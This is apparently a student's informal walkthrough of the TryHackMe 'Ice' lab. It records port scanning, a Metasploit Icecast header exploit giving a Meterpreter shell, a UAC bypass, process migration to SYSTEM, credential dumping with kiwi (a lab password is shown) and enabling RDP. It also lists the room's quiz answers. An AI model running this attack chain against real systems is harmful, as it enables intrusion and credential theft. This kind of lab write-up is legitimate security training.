lab for https://tryhackme.com/room/ice
--Conenct--
conencted vpn
--Recon--
started machine for enumerating, ip--10.10.164.55
started syn scan on victim machine nmap -sS 10.10.164.55
6 open ports found 
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

tried various nmap commands -sn, -pn, -v, , researching nmap fro proper commands
nmap -sL no hostname given
nmap -sC displays hostname
Answers---, 3389, Icecast, and Dark-pc
--Gain access--
traveled to cvedetails for answers
Answers---,Execute CodeOverflow,CVE-2004-1561, 
launched msfconsole to launch exploit
ran command serach icecast to search the exploit for the given vulnerability
answers--exploit/windows/http/icecast_header 
ran use command to use current exploit found with search
ran show options command in order to set options
answer--RHOSTS is the only option not set
I set my listening host option with the set LHOST command along with my ip<found said ip from ifconfig>   10.2.70.52 
--Escalate--
set receiving host or RHOSTS to 10.10.164.55
ran the exploit command and now I have a --answer  <meterpreter> shell
ran the ps command to get the list of runnign processes on the machine
Icecast2.exe is the name of the process running  by answer--- user <dark>
i ran the sysinfo command to get windows 7 build --answer--<7601>
answer---architecture is x64 as shown from above sysinfo command I ran
i ran the command run post/multi/recon/local_exploit_suggester for more reconosense 
answer--exploit/windows/local/bypassuac_eventvwr  this is the eventviewer that is vulnerablility number 1 in the list collected
ran ctrl z to background the session
added time machine expired, BS
reconencted 
show options
session listed a few. oops
set session 1 was the command I used to set the first session 
answer--, LHOST, the listener host is incorrect and must be 10.2.70.52, found this by command ifconfig
running exploit
of course port 4444 blocked by comcast again, using LPORT set to 4433
backgrounded the shell
ran command sessions 3
ran getprivs command to list privledges
answer--SeTakeOwnershipPrivilege
--Looting--
answers--<spoolsv.exe>  this is the windows spooler service which we will sue since it shares the same NT Authority\SYStem as with lsass.exe
now using migrate command ---migrate -N spoolsv.exe this will migrate to the process
ran getuid to show that Answer--< NT Authority/System> is the servcie username
load kiwi is the command i used next for for looting as we now are escalated
ran help command to see the commands now loaded in my help menu
answer<creds_all>  this is used to retrieve all credentials
ran creds_all and now all passwords revealed
answer for Dark's apssword------Password01!
--Post-exploitation---
ran help command to list help commands and answer next set of questions
Answer---hasdump, screenshare, record_mic, timestomp, golden_ticket_create
ran the following code >>>run post/windows/manage/enable_rdp   this ensures that RDP is enabled in case it wasn't
--Extra Credit---
visted link https://www.exploit-db.com/exploits/568
buil .sh file using vim
copied code from site
.\script file i made
 will check out blaster lab for process
 







